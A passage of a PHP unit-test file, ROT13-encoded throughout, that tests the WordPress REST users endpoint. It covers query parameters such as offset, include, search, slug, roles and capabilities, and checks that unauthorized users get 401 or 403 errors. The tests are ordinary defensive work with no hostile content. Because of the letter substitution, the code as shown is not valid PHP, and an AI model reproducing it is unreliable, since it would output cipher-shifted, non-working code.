		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_beqreol() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_bssfrg() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'bssfrg', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( frys::$gbgny_hfref - 1, $erfcbafr->trg_qngn() );

		// 'bssfrg' jbexf jvgu 'cre_cntr'.
		$erdhrfg->frg_cnenz( 'cre_cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );

		// 'bssfrg' gnxrf cevbevgl bire 'cntr'.
		$erdhrfg->frg_cnenz( 'cntr', 3 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );

		// Vainyvq 'bssfrg' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'bssfrg', 'zbercyrnfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_vapyhqr_dhrel() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$vq1 = frys::snpgbel()->hfre->perngr();
		$vq2 = frys::snpgbel()->hfre->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );

		// 'beqreol' => 'nfp'.
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq2, $vq1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );

		// 'beqreol' => 'vapyhqr'.
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );

		// Vainyvq 'vapyhqr' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'vapyhqr', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		// Ab cevivyrtrf.
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq2, $vq1 ) );
		jc_frg_pheerag_hfre( 0 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 0, $qngn );
	}

	choyvp shapgvba grfg_trg_vgrzf_rkpyhqr_dhrel() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$vq1 = frys::snpgbel()->hfre->perngr();
		$vq2 = frys::snpgbel()->hfre->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr ); // Gurer ner >10 hfref ng guvf cbvag.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregPbagnvaf( $vq2, $vqf );

		$erdhrfg->frg_cnenz( 'rkpyhqr', neenl( $vq2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq2, $vqf );

		// Vainyvq 'rkpyhqr' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'rkpyhqr', 'abar-bs-gubfr-cyrnfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_frnepu() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'lbybybybyb' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );

		$lbyb_vq = frys::snpgbel()->hfre->perngr( neenl( 'qvfcynl_anzr' => 'lbybybybyb' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'lbybybybyb' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );
		// Qrsnhyg gb jvyqpneq frnepu.
		$nqnz_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'          => 'nhgube',
				'hfre_avpranzr' => 'nqnz',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'nqn' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $nqnz_vq, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_frnepu_svryqf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'lbybybybyb' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );

		$lbyb_vq = frys::snpgbel()->hfre->perngr( neenl( 'hfre_rznvy' => 'lbybybybyb@rknzcyr.ybpnyubfg' ) );

		jc_frg_pheerag_hfre( frys::$hfre );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'lbybybybyb' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );

		jc_frg_pheerag_hfre( frys::$rqvgbe );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );
	}

	/**
	 * @gvpxrg 62596
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_pbyhzaf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'lbybybybyb' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );

		frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Nqnz',
				'hfre_rznvy'   => 'lbybybybyb@rknzcyr.ybpnyubfg',
			)
		);

		jc_frg_pheerag_hfre( frys::$hfre );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'lbybybybyb' );
		$erdhrfg->frg_cnenz( 'frnepu_pbyhzaf', 'rznvy' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'lbybybybyb' );
		$erdhrfg->frg_cnenz( 'frnepu_pbyhzaf', 'anzr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'Nqnz' );
		$erdhrfg->frg_cnenz( 'frnepu_pbyhzaf', 'anzr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );
	}

	/**
	 * @gvpxrg 62596
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_pbyhzaf_jvgubhg_crezvffvba() {
		frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Nqnz',
				'hfre_rznvy'   => 'lbybybybyb@rknzcyr.ybpnyubfg',
			)
		);

		// Grfg hfre jvgubhg fhssvpvrag pncnovyvgvrf - 'yvfg_hfref'.
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'lbybybybyb' );
		$erdhrfg->frg_cnenz( 'frnepu_pbyhzaf', 'rznvy' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );
	}

	choyvp shapgvba grfg_trg_vgrzf_fyht_dhrel() {
		jc_frg_pheerag_hfre( frys::$hfre );

		frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'sbb',
				'hfre_ybtva'   => 'one',
			)
		);
		$vq2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Zbb',
				'hfre_ybtva'   => 'sbb',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'fyht', 'sbb' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_fyht_neenl_dhrel() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$vq1 = frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Gnpb',
				'hfre_ybtva'   => 'gnpb',
			)
		);
		$vq2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Rapuvynqn',
				'hfre_ybtva'   => 'rapuvynqn',
			)
		);
		$vq3 = frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Oheevgb',
				'hfre_ybtva'   => 'oheevgb',
			)
		);
		frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Uba Cvmmn',
				'hfre_ybtva'   => 'cvmmn',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz(
			'fyht',
			neenl(
				'gnpb',
				'oheevgb',
				'rapuvynqn',
			)
		);
		$erdhrfg->frg_cnenz( 'beqreol', 'fyht' );
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn  = $erfcbafr->trg_qngn();
		$fyhtf = jc_yvfg_cyhpx( $qngn, 'fyht' );
		$guvf->nffregFnzr( neenl( 'oheevgb', 'rapuvynqn', 'gnpb' ), $fyhtf );
	}

	choyvp shapgvba grfg_trg_vgrzf_fyht_pfi_dhrel() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$vq1 = frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Gnpb',
				'hfre_ybtva'   => 'gnpb',
			)
		);
		$vq2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Rapuvynqn',
				'hfre_ybtva'   => 'rapuvynqn',
			)
		);
		$vq3 = frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Oheevgb',
				'hfre_ybtva'   => 'oheevgb',
			)
		);
		frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Uba Cvmmn',
				'hfre_ybtva'   => 'cvmmn',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'fyht', 'gnpb,oheevgb , rapuvynqn' );
		$erdhrfg->frg_cnenz( 'beqreol', 'fyht' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn  = $erfcbafr->trg_qngn();
		$fyhtf = jc_yvfg_cyhpx( $qngn, 'fyht' );
		$guvf->nffregFnzr( neenl( 'gnpb', 'rapuvynqn', 'oheevgb' ), $fyhtf );
	}

	/**
	 * Abgr: Qb abg grfg hfvat rqvgbe ebyr nf gurer vf na rqvgbe ebyr perngrq va grfgvat,
	 * naq vg znxrf vg uneq gb grfg guvf shapgvbanyvgl.
	 */
	choyvp shapgvba grfg_trg_vgrzf_ebyrf() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'ebyrf', 'nhgube,fhofpevore' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( frys::$nhgube, $qngn[0]['vq'] );
		$guvf->nffregFnzr( frys::$fhofpevore, $qngn[1]['vq'] );

		$erdhrfg->frg_cnenz( 'ebyrf', 'nhgube' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( frys::$nhgube, $qngn[0]['vq'] );

		jc_frg_pheerag_hfre( 0 );

		$erdhrfg->frg_cnenz( 'ebyrf', 'nhgube' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 401 );

		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg->frg_cnenz( 'ebyrf', 'nhgube' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_ebyrf() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'ebyrf', 'vybirfgrnx,nhgube' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( frys::$nhgube, $qngn[0]['vq'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'ebyrf', 'fgrnxvftbbq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregRzcgl( $qngn );
	}

	/**
	 * @gvpxrg 16841
	 */
	choyvp shapgvba grfg_trg_vgrzf_pncnovyvgvrf() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'pncnovyvgvrf', 'rqvg_cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregAbgRzcgl( $qngn );
		sbernpu ( $qngn nf $hfre ) {
			$guvf->nffregGehr( hfre_pna( $hfre['vq'], 'rqvg_cbfgf' ) );
		}
	}

	/**
	 * @gvpxrg 16841
	 */
	choyvp shapgvba grfg_trg_vgrzf_pncnovyvgvrf_ab_crezvffvba_ab_hfre() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'pncnovyvgvrf', 'rqvg_cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 16841
	 */
	choyvp shapgvba grfg_trg_vgrzf_pncnovyvgvrf_ab_crezvffvba_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'pncnovyvgvrf', 'rqvg_cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 16841
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_pncnovyvgvrf() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'ebyrf', 'vybirfgrnx,nhgube' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( frys::$nhgube, $qngn[0]['vq'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'pncnovyvgvrf', 'fgrnxvftbbq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregRzcgl( $qngn );
	}

	/**
	 * @rkcrpgrqQrcerpngrq JC_Hfre_Dhrel
	 */
	choyvp shapgvba grfg_trg_vgrzf_jub_nhgube_dhrel() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva );

		// Svefg erdhrfg fubhyq vapyhqr fhofpevore va gur frg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'frnepu', 'fhofpevore' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );

		// Frpbaq erdhrfg fubhyq rkpyhqr fhofpevore.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'jub', 'nhgubef' );
		$erdhrfg->frg_cnenz( 'frnepu', 'fhofpevore' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );
	}

	choyvp shapgvba grfg_trg_vgrzf_jub_vainyvq_dhrel() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'jub', 'rqvgbe' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Nal hfre jvgu 'rqvg_cbfgf' ba n fubj_va_erfg cbfg glcr
	 * pna ivrj nhgubef. Bguref (r.t. fhofpevoref) pnaabg.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jub_hanhgubevmrq_dhrel() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'jub', 'nhgubef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_jub', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_trg_vgrz() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_hfre_erfcbafr( $erfcbafr, 'rzorq' );
	}

	choyvp shapgvba grfg_cercner_vgrz() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg();
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$hfre = trg_hfre_ol( 'vq', trg_pheerag_hfre_vq() );
		$qngn = $guvf->raqcbvag->cercner_vgrz_sbe_erfcbafr( $hfre, $erdhrfg );
		$guvf->purpx_trg_hfre_erfcbafr( $qngn, 'rqvg' );
	}

	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg();
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq,anzr' );
		$hfre     = trg_hfre_ol( 'vq', trg_pheerag_hfre_vq() );
		$erfcbafr = $guvf->raqcbvag->cercner_vgrz_sbe_erfcbafr( $hfre, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'anzr',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	choyvp shapgvba grfg_trg_hfre_ningne_heyf() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$rqvgbe ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 24, $qngn['ningne_heyf'] );
		$guvf->nffregNeenlUnfXrl( 48, $qngn['ningne_heyf'] );
		$guvf->nffregNeenlUnfXrl( 96, $qngn['ningne_heyf'] );

		$hfre = trg_hfre_ol( 'vq', frys::$rqvgbe );
		// Vtaber gur fhoqbznva, fvapr trg_ningne_hey() enaqbzyl frgf
		// gur Teningne freire jura ohvyqvat gur HEY fgevat.
		$guvf->nffregFnzr( fhofge( trg_ningne_hey( $hfre->hfre_rznvy ), 9 ), fhofge( $qngn['ningne_heyf'][96], 9 ) );
	}

	choyvp shapgvba grfg_trg_hfre_vainyvq_vq() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_hfre_rzcgl_pncnovyvgvrf() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		$ybym = frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'ybym',
				'ebyrf'        => '',
			)
		);

		qryrgr_hfre_bcgvba( $ybym, 'pncnovyvgvrf' );
		qryrgr_hfre_bcgvba( $ybym, 'hfre_yriry' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref/' . $ybym );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
		} ryfr {
			$qngn = $erfcbafr->trg_qngn();

			$guvf->nffregRdhnyf( $qngn['pncnovyvgvrf'], arj fgqPynff() );
			$guvf->nffregRdhnyf( $qngn['rkgen_pncnovyvgvrf'], arj fgqPynff() );
		}
	}

	choyvp shapgvba grfg_pnaabg_trg_vgrz_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$hfre ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_pna_trg_vgrz_nhgube_bs_erfg_gehr_choyvp_gehr_hanhguragvpngrq() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$nhgubef['e_gehr_c_gehr'] ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_pna_trg_vgrz_nhgube_bs_erfg_gehr_choyvp_gehr_nhguragvpngrq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$nhgubef['e_gehr_c_gehr'] ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_pna_trg_vgrz_nhgube_bs_erfg_gehr_choyvp_snyfr() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$nhgubef['e_gehr_c_snyfr'] ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_pnaabg_trg_vgrz_nhgube_bs_erfg_snyfr_choyvp_gehr_hanhguragvpngrq() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$nhgubef['e_snyfr_c_gehr'] ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_pnaabg_trg_vgrz_nhgube_bs_erfg_snyfr_choyvp_gehr_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$nhgubef['e_snyfr_c_gehr'] ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_pnaabg_trg_vgrz_nhgube_bs_erfg_snyfr_choyvp_snyfr() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$nhgubef['e_snyfr_c_snyfr'] ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_ivrj', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_pna_trg_vgrz_nhgube_bs_cbfg() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$rqvgbe ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_pnaabg_trg_vgrz_nhgube_bs_qensg() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$qensg_rqvgbe ) );
